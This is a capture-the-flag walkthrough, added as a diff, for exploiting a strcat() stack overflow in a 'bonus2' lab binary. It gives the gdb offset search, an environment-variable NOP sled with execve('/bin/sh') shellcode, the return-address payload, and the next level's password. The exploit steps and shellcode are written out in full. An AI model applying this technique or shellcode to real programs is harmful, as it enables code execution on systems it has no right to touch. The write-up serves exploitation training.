@@ -1,0 +1,107 @@
+# Bonus2 - Buffer Overflow via strcat() with Language Selection
+
+---
+
+# PART 1: Walkthrough
+
+## Step 1: Test the program
+
+```bash
+./bonus2
+# No output
+
+./bonus2 d d
+Hello d
+
+./bonus2 test test
+Hello test
+```
+
+Program needs 2 arguments and prints "Hello" + first argument.
+
+## Step 2: Analyze with GDB
+
+```bash
+gdb bonus2
+(gdb) disas main
+(gdb) disas greetuser
+```
+
+**Key findings:**
+- `main`: Checks `argc == 3`, copies `argv[1]` (40 bytes) and `argv[2]` (32 bytes) with `strncpy`
+- `main`: Gets `LANG` env variable, checks for "fi" or "nl"
+- `greetuser`: Copies greeting based on language, uses `strcat` (vulnerable!)
+- Buffer in `greetuser`: 72 bytes at `ebp-0x48`
+
+## Step 3: Find the offset to EIP
+
+Set Finnish language for longest greeting:
+
+```gdb
+(gdb) set environment LANG=fi
+(gdb) break *greetuser+147
+(gdb) run $(python -c 'print "A"*40') $(python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII"')
+(gdb) continue
+```
+
+**Result:**
+```
+Program received signal SIGSEGV, Segmentation fault.
+0x46464545 in ?? ()
+```
+
+EIP = `0x46464545` = "EEFF" → Offset is at position of "EEEE" in argv[2]
+
+Counting from start of argv[2]: `AAAA(4) BBBB(8) CCCC(12) DDDD(16) EEEE(20)`
+
+**Offset = 18 bytes** in argv[2] before EIP
+
+## Step 4: Export shellcode
+
+```bash
+export SHELLCODE=$(python -c 'print "\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
+```
+
+## Step 5: Find shellcode address
+
+```bash
+gdb bonus2
+(gdb) break main
+(gdb) run test test
+(gdb) x/500s environ
+```
+
+Look for `SHELLCODE=\x90\x90...`
+
+**Found at:** `0xbffff81d: "SHELLCODE=..."`
+
+Choose address in middle of NOP sled: `0xbffff880`
+
+## Step 6: Build the payload
+
+```bash
+export LANG=fi
+./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*18 + "\x80\xf8\xff\xbf"')
+```
+
+**Payload structure:**
+- argv[1]: `"A" * 40` (fills first buffer, no null terminator)
+- argv[2]: `"B" * 18` (padding) + `\x80\xf8\xff\xbf` (shellcode address)
+
+## Step 7: Execute
+
+```bash
+export LANG=fi
+./bonus2 $(python -c 'print "A"*40') $(python -c 'print "B"*18 + "\x80\xf8\xff\xbf"')
+```
+
+Then:
+```bash
+$ whoami
+bonus3
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+```
+
+---
+
